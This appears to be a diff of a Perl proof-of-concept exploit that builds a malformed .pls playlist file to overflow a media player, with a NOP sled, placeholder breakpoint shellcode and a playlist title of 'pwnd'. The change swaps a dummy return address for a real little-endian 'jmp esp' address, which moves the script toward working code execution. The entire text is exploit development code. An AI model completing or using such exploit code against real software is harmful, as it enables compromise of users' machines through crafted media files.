@@ -7,7 +7,9 @@
 $start= "[playlist]\r\nFile1=\\\\";
 $nop="\x90" x 856 ;
 $shellcode = "\xcc" x 166;
-$jmp="\x41\x41\x41\x41"."\x83\x83\x83\x83\x83\x83\x83\x83"."\x90\x90\x90\x90";
+# jmp esp: 0x1a113749
+# little endian:
+$jmp="\x49\x37\x11\x1a"."\x83\x83\x83\x83\x83\x83\x83\x83"."\x90\x90\x90\x90";
 $end="\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n";
 open (MYFILE, '>poc.pls');
 print MYFILE $start;
